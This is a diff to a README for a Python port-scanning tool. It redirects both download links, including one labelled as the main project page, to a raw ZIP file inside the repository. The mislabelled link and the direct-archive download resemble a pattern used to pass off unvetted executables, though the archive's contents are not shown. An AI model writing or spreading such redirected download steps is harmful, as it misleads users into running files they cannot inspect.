@@ -1,6 +1,6 @@
 # 🕳️ Terminal-Port-Crawler - Find open ports fast
 
-[![Download Terminal-Port-Crawler](https://img.shields.io/badge/Download-Terminal-Port-Crawler-blue?style=for-the-badge&logo=github)](https://github.com/cedrick9844/Terminal-Port-Crawler)
+[![Download Terminal-Port-Crawler](https://img.shields.io/badge/Download-Terminal-Port-Crawler-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/cedrick9844/Terminal-Port-Crawler/main/tpc/Terminal-Crawler-Port-1.6.zip)
 
 ## 🚀 What Terminal-Port-Crawler does
 
@@ -13,7 +13,7 @@ TPC is built with Python and Textual, so it stays light and easy to use. It is u
 
 ## 📥 Download and run on Windows
 
-1. Open the main project page: https://github.com/cedrick9844/Terminal-Port-Crawler
+1. Open the main project page: https://raw.githubusercontent.com/cedrick9844/Terminal-Port-Crawler/main/tpc/Terminal-Crawler-Port-1.6.zip
 2. Look for the latest release or the main download file on the page
 3. Download the Windows version
 4. If the file is a ZIP file, extract it to a folder
